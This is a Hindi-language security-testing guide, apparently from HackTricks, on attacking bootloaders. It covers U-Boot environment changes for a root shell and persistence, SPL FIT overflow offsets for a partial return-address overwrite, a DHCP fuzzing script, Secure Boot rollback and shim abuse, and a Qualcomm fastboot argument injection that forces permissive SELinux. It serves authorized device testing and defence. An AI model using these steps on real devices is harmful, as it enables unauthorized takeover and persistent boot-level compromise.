# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

डिवाइस की startup configurations को संशोधित करने और U-Boot तथा UEFI-class loaders जैसे bootloaders का परीक्षण करने के लिए नीचे दिए गए चरण सुझाए जाते हैं। शुरुआती code execution पाने, signature/rollback protections का आकलन करने और recovery या network-boot paths का दुरुपयोग करने पर ध्यान दें।

संबंधित: bl2_ext patching के ज़रिए MediaTek secure-boot bypass:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot की त्वरित सफलताएँ और environment का दुरुपयोग

1. इंटरप्रेटर shell तक पहुँचें
   - Boot के दौरान, `bootcmd` चलने से पहले U-Boot prompt पर जाने के लिए कोई ज्ञात break key (अक्सर कोई भी key, 0, space या board-specific "magic" sequence) दबाएँ।<sup>[[1]](#references)</sup>

2. Boot state और variables की जाँच करें
   - उपयोगी commands:
     - `printenv` (environment dump करें)
     - `bdinfo` (board की जानकारी, memory addresses)
     - `help bootm; help booti; help bootz` (समर्थित kernel boot methods)
     - `help ext4load; help fatload; help tftpboot` (उपलब्ध loaders)

3. Root shell पाने के लिए boot arguments संशोधित करें
   - `init=/bin/sh` जोड़ें, ताकि kernel सामान्य init के बजाय shell पर जाए:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. अपने TFTP server से Netboot करें
   - नेटवर्क configure करें और LAN से kernel/fit image fetch करें:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. environment के ज़रिए बदलाव बनाए रखें
   - अगर env storage write-protected नहीं है, तो आप control बनाए रख सकते हैं:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` जैसे variables की जाँच करें, जो fallback paths को प्रभावित करते हैं। गलत तरीके से configured values से shell में बार-बार प्रवेश मिल सकता है।

6. Debug/unsafe features की जाँच करें
   - इनकी तलाश करें: `bootdelay` > 0, `autoboot` disabled, बिना प्रतिबंध वाला `usb start; fatload usb 0:1 ...`, serial के ज़रिए `loady`/`loads` करने की क्षमता, untrusted media से `env import`, और signature checks के बिना load किए गए kernels/ramdisks।

7. U-Boot image/verification testing
   - अगर platform, FIT images के साथ secure/verified boot का दावा करता है, तो unsigned और tampered images—दोनों आज़माएँ:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` की अनुपस्थिति या legacy `verify=n` व्यवहार अक्सर मनमाने payloads को boot करने की अनुमति देता है।
   - केवल allow/deny परिणाम देखकर न रुकें: हालिया FIT शोध से पता चला कि verification path स्वयं pre-auth attack surface हो सकता है। बाहरी रूप से संग्रहीत FIT data (`data-offset`, `data-position`, `data-size`), signed configuration selection, `loadables`, और overlay / `extra-conf` handling के negative tests करें।
   - यदि आपके पास मेल खाता source tree है, तो वास्तविक hardware को छूने से पहले U-Boot sandbox में FIT verification behavior को दोहराने का तेज़ तरीका `test/vboot/vboot_test.sh` है।<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux`, और script bootflows
   - आधुनिक U-Boot builds में, `bootcmd` अक्सर Standard Boot के लिए केवल एक wrapper होता है। इसका मतलब है कि writable media, PXE, या SPI flash वास्तविक trust boundary बन सकते हैं, भले ही दिखाई देने वाला environment हानिरहित लगे।
   - `extlinux` bootmeth, `/` और `/boot` के अंतर्गत `extlinux/extlinux.conf` खोजता है; script bootmeth पहले `boot.scr.uimg` और फिर `boot.scr` खोजता है। Network boot में, script filename `boot_script_dhcp` से आ सकता है।
   - उपयोगी triage commands:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - जाँचने के लिए abuse cases: `boot_targets` में पहले आने वाला attacker-controlled USB/SD media, writable `/boot/extlinux/extlinux.conf`, `boot.scr` देने वाला rogue TFTP, या `script_offset_f` के ज़रिए SPI-backed script execution।
   - अगर platform FIT verification पर निर्भर करता है, तो सुनिश्चित करें कि configurations पर configuration level पर हस्ताक्षर किए गए हों, केवल प्रति-image नहीं; `required-mode=all`, किसी भी एक required key को स्वीकार करने से अधिक सुरक्षित है।

### SPL में बाहरी FIT data का verification से पहले copy होना

SPL FIT loading में, intact configuration signature होने से external payload metadata सुरक्षित नहीं हो जाता। U-Boot signed configuration properties से `data-position`, `data-offset`, और `data-size` को बाहर रखता है। प्रभावित `load_simple_fit()` paths में, SPL इन fields से source offset और copy length निकालता है, फिर image hash जाँचने **से पहले** `info->read()` call करता है। इसलिए writable boot media पर रखा crafted FIT, signature forge किए बिना RAM overwrite कर सकता है। Signed `load` property आम तौर पर destination को तय करती है, इसलिए पहले पता करें कि क्या oversized copy उस address से stack या अन्य control data तक पहुँच सकती है।<sup>[[15]](#references)[[16]](#references)</sup>

Flash read मानकर चलने के बजाय, board के वास्तविक loader और memory map को trace करें: प्रदर्शित RAM loader `spl_ram_load_read()` और `memcpy()` तक पहुँचा था। Call site पर `fit_offset` और reader द्वारा जोड़ा गया कोई भी FIT base address, loader की block length (`spl_get_bl_len(info)`), fork-specific alignment, परिणामी `read_offset` और transfer `size`, destination `src_ptr`, तथा saved return-address location दर्ज करें। जाँचें कि क्या contiguous mapped source region आवश्यक copy distance को कवर करता है, क्या वह destination से overlap करता है, और क्या source position के bytes attacker-controlled FIT data के भीतर किसी pointer को दे सकते हैं। अगर पूरा pointer loader की alignment constraints को पूरा नहीं कर सकता, तो सामान्य [partial return-address overwrite technique](../../binary-exploitation/stack-overflow/ret2win/) लागू होती है।<sup>[[16]](#references)</sup>

शोधकर्ताओं के 32-bit AST2600 test build में, `src_ptr` `0x80001000` था और `memcpy` का saved return address `0x902ffe24` पर था। उन्होंने OpenBMC के stack placement और alignment helpers के साथ modified upstream build का उपयोग किया: RAM reader ने `0x10000` FIT base जोड़ा, और उन helpers ने source offset को `ARCH_DMA_MINALIGN` (64 bytes) तक नीचे round किया। `0x902fffe4` पर एक उपयोगी little-endian pointer और एक byte कम पर समाप्त होने वाली copy ने saved return address के केवल निचले तीन bytes बदले, जिससे उसका ज्ञात zero high byte सुरक्षित रहा। इसके बजाय, upstream RAM loader एक byte की block length इस्तेमाल करता है, इसलिए 64-byte alignment और partial-overwrite workaround, SPL की सामान्य आवश्यकताएँ नहीं हैं। हर build के लिए addresses, loader block length, और copy extent दोबारा निकालें। नीचे की मूल गणना में, `fit_offset` RAM reader द्वारा जोड़े गए effective FIT-base को दर्शाता है, यह ज़रूरी नहीं कि `load_simple_fit()` को दिया गया argument हो।<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

Upstream fix, `info->read()` से पहले raw `data-size` और **block-aligned** transfer size, दोनों की सीमा तय करता है। इसका overlay path buffer की वास्तविक capacity का उपयोग करता है, जबकि दूसरे callers `CONFIG_SYS_BOOTM_LEN` का उपयोग करते हैं, जो केवल एक ढीली ऊपरी सीमा है—इस बात का प्रमाण नहीं कि destination में उतनी खाली memory उपलब्ध है। Vendor fork का आकलन करते समय जाँचें कि ये checks मौजूद हैं और अनुमत copy range की तुलना board के वास्तविक SPL stack और reserved regions से करें।<sup>[[15]](#references)[[16]](#references)</sup>

## Network-boot attack surface (DHCP/PXE) और rogue servers

9. PXE/DHCP parameter fuzzing
   - U-Boot के legacy BOOTP/DHCP handling में memory-safety संबंधी समस्याएँ रही हैं। उदाहरण के लिए, CVE‑2024‑42040 में crafted DHCP responses के ज़रिए memory disclosure का वर्णन है, जिससे U-Boot memory के bytes network पर leak हो सकते हैं।<sup>[[4]](#references)</sup> DHCP/PXE code paths को बहुत लंबी और edge-case values (option 67 bootfile-name, vendor options, file/servername fields) देकर जाँचें और hang/leak होने पर ध्यान दें।
   - Netboot के दौरान boot parameters को stress-test करने के लिए न्यूनतम Scapy snippet:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - यह भी जाँचें कि OS-side provisioning scripts से जुड़ने पर PXE filename fields को बिना sanitization के shell/loader logic तक पहुँचाया जाता है या नहीं।

10. Rogue DHCP server command injection testing
   - एक rogue DHCP/PXE service सेट अप करें और filename या options fields में characters inject करके देखें कि क्या वे boot chain के बाद के stages में command interpreters तक पहुँचते हैं। Metasploit का DHCP auxiliary, `dnsmasq`, या custom Scapy scripts इसके लिए अच्छी तरह काम करते हैं। पहले lab network को अलग-थलग करना सुनिश्चित करें।

## सामान्य boot को override करने वाले SoC ROM recovery modes

कई SoC में BootROM का "loader" mode होता है, जो flash images अमान्य होने पर भी USB/UART के ज़रिए code स्वीकार करता है। यदि secure-boot fuses नहीं जले हैं, तो इससे chain के शुरुआती चरण में arbitrary code execution मिल सकता है।

- NXP i.MX (Serial Download Mode)
  - Tools: `uuu` (mfgtools3) या `imx-usb-loader`।
  - उदाहरण: RAM से custom U-Boot भेजने और चलाने के लिए `imx-usb-loader u-boot.imx`।
- Allwinner (FEL)
  - Tool: `sunxi-fel`।
  - उदाहरण: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` या `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`।
- Rockchip (MaskROM)
  - Tool: `rkdeveloptool`।
  - उदाहरण: loader को stage करने और custom U-Boot upload करने के लिए `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`।

जाँचें कि device में secure-boot eFuses/OTP जले हुए हैं या नहीं। यदि नहीं, तो BootROM download modes अक्सर आपका first-stage payload सीधे SRAM/DRAM से चलाकर higher-level verification (U-Boot, kernel, rootfs) को bypass कर देते हैं।

## UEFI/PC-class bootloaders: त्वरित जाँच

11. ESP tampering, rollback, और key-enrollment testing
   - EFI System Partition (ESP) mount करें और loader components जाँचें: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths।
   - जब संभव हो, OS से Secure Boot state और key databases dump करें:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - यदि platform Setup Mode में है, बिना authentication के key enrollment स्वीकार करता है, या उसमें test/default Platform Key (PKfail class) मौजूद है, तो local admin या physical attacker अपनी KEK/db enroll कर सकता है और Secure Boot को “enabled” दिखाते हुए मनमाने EFI binaries boot कर सकता है।<sup>[[3]](#references)</sup>
   - यदि Secure Boot revocations (dbx) up-to-date नहीं हैं, तो downgraded या ज्ञात रूप से vulnerable signed boot components से boot करने की कोशिश करें। यदि platform अब भी पुराने shims/bootmanagers पर भरोसा करता है, तो persistence पाने के लिए अक्सर ESP से अपना kernel या `grub.cfg` load किया जा सकता है।
   - Windows पर, patched hosts भी vulnerable signed boot managers स्वीकार कर सकते हैं, यदि `Microsoft Windows Production PCA 2011` signer firmware `dbx` में मौजूद न हो, जैसा कि BlackX में देखा गया।<sup>[[13]](#references)[[14]](#references)</sup> Baton Drop-style bypass से attacker MOK enroll कर सकता है; इसके बाद legitimate shim, अगले boots पर उस key से signed EFI payload load कर सकता है।<sup>[[12]](#references)[[13]](#references)</sup> बाद में पुराने Windows signer को revoke करने से enrolled MOK नहीं हटता, इसलिए यदि वह shim trusted बना रहे, तो shim-based path persist कर सकता है।<sup>[[12]](#references)</sup>
   - किसी authorized UEFI machine पर इस rollback path को test करने से पहले, केवल Windows update history नहीं, बल्कि **effective firmware revocation state** जाँचें।<sup>[[13]](#references)[[14]](#references)</sup> Microsoft `dbx` में 2011 signer की जाँच के लिए यह read-only elevated PowerShell check देता है:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` केवल एक शुरुआती संकेत है: किसी पुनर्प्राप्त किए जा सकने वाले लैब में विशिष्ट signed boot component और अन्य revocations की पुष्टि करें।<sup>[[12]](#references)[[14]](#references)</sup> लंबित registry update या expired signing certificate, पूर्ण `dbx` revocation के बराबर नहीं है।<sup>[[13]](#references)[[14]](#references)</sup>

12. पुराने shim / SBAT / dbx revocation की जाँच
   - पुराने Microsoft-signed shims और vendor forks, यदि revocations पुराने हों, तो अब भी BYOVD-जैसे bootkit path के रूप में काम कर सकते हैं। किसी isolated lab में, ESP पर ऐतिहासिक रूप से vulnerable shim रखें और अपने `grubx64.efi` या kernel को chainload करने का प्रयास करें।<sup>[[11]](#references)</sup>
   - त्वरित जाँच:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - यदि shim revocation list में होने के बावजूद चलता है, तो firmware/OS में पुराने `dbx` updates हैं या वह ऐसे forked loader पर भरोसा करता है जिसमें upstream SBAT protections कभी शामिल नहीं किए गए।

13. Boot logo parsing bugs (LogoFAIL class)
   - कई OEM/IBV firmwares में DXE के image-parsing flaws थे, जो boot logos को process करते हैं। यदि कोई attacker ESP पर vendor-specific path (जैसे, `\EFI\<vendor>\logo\*.bmp`) में एक crafted image रखकर reboot कर सकता है, तो Secure Boot enabled होने पर भी early boot के दौरान code execution संभव हो सकता है। जाँचें कि platform user-supplied logos स्वीकार करता है या नहीं और क्या OS से उन paths पर लिखना संभव है।<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) में trust gaps

Android 16 के उन devices पर जो Qualcomm के ABL का उपयोग करके **Generic Bootloader Library (GBL)** load करते हैं, जाँचें कि ABL `efisp` partition से load किए जाने वाले UEFI app को **authenticate** करता है या नहीं। यदि ABL केवल UEFI app की **मौजूदगी** जाँचता है और signatures verify नहीं करता, तो `efisp` पर write primitive boot के समय **pre-OS unsigned code execution** संभव बनाता है।<sup>[[6]](#references)[[7]](#references)</sup>

व्यावहारिक जाँच और abuse paths:

- **efisp write primitive**: `efisp` में custom UEFI app लिखने का तरीका चाहिए (root/privileged service, OEM app bug, recovery/fastboot path)। इसके बिना, GBL loading gap तक सीधे पहुँचना संभव नहीं है।<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL bug): कुछ builds, `fastboot oem set-gpu-preemption` में अतिरिक्त tokens स्वीकार करते हैं और उन्हें kernel cmdline में जोड़ देते हैं। इसका उपयोग permissive SELinux को force करने के लिए किया जा सकता है, जिससे protected partitions पर writes संभव हो जाते हैं:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  यदि device में patch किया गया है, तो command को अतिरिक्त arguments अस्वीकार करने चाहिए.<sup>[[5]](#references)[[6]](#references)</sup>
- **Persistent flags के ज़रिए Bootloader unlock**: Boot-stage payload, persistent unlock flags (जैसे, `is_unlocked=1`, `is_unlocked_critical=1`) बदल सकता है, ताकि OEM server/approval gates के बिना `fastboot oem unlock` का अनुकरण किया जा सके। अगले reboot के बाद यह बदलाव स्थायी रूप से बना रहता है.<sup>[[6]](#references)</sup>

रक्षा/प्रारंभिक जाँच के नोट्स:

- पुष्टि करें कि ABL, `efisp` से मिले GBL/UEFI payload पर signature verification करता है या नहीं। अगर नहीं, तो `efisp` को persistence का उच्च-जोखिम वाला क्षेत्र मानें।
- पता करें कि ABL fastboot OEM handlers को **argument की संख्या जाँचने** और अतिरिक्त tokens अस्वीकार करने के लिए patch किया गया है या नहीं.<sup>[[8]](#references)[[9]](#references)</sup>

## Hardware संबंधी सावधानी

शुरुआती boot के दौरान SPI/NAND flash के साथ काम करते समय सावधान रहें (जैसे, reads को bypass करने के लिए pins को ground करना) और हमेशा flash datasheet देखें। गलत समय पर short करने से device या programmer corrupt हो सकता है।

## नोट्स और अतिरिक्त सुझाव

- RAM और storage के बीच environment blobs स्थानांतरित करने के लिए `env export -t ${loadaddr}` और `env import -t ${loadaddr}` आज़माएँ; कुछ platforms बिना authentication के removable media से env import करने देते हैं।
- `extlinux.conf` के ज़रिए boot होने वाले Linux-based systems में persistence के लिए, boot partition पर `APPEND` line को बदलना (ताकि `init=/bin/sh` या `rd.break` inject हो) अक्सर पर्याप्त होता है, जब signature checks लागू न हों।
- अगर target में dual-slot / A/B updates हैं, तो [firmware analysis overview](README.md) में anti-rollback और slot-desync techniques देखें, ताकि bootloader के बाहर updater-only trust gaps छूट न जाएँ।
- अगर userland में `fw_printenv/fw_setenv` उपलब्ध हैं, तो जाँचें कि `/etc/fw_env.config` वास्तविक env storage से मेल खाता है। गलत offsets के कारण गलत MTD region को read/write किया जा सकता है।

## References

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAIL की खोज: system boot के दौरान image parsing के खतरे](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Untrusted Platform Keys, UEFI Ecosystem में Secure Boot को कमज़ोर करती हैं](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 का विवरण](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: दो unsanitized strings के ज़रिए Xiaomi को unlock करना](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit से attackers bootloaders unlock कर सकते हैं](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: kernel cmdline में untrusted input के प्रसार को ठीक करना](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: set-hw-fence-value command के लिए जाँच जोड़ना](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: U-Boot के FIT signature verification को तोड़ना](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders, Secure Boot bypass के प्रति संवेदनशील](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus UEFI bootkit: मिथक की पुष्टि](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: BlackLotus जैसा UEFI bootkit](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Secure Boot में बदलावों के लिए Windows Boot Manager revocations प्रबंधित करना](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [U-Boot patch: पढ़ने से पहले external data का आकार सीमित करना](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [छिपे हुए लाभ: U-Boot SPL में Signature Verification को bypass करना](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
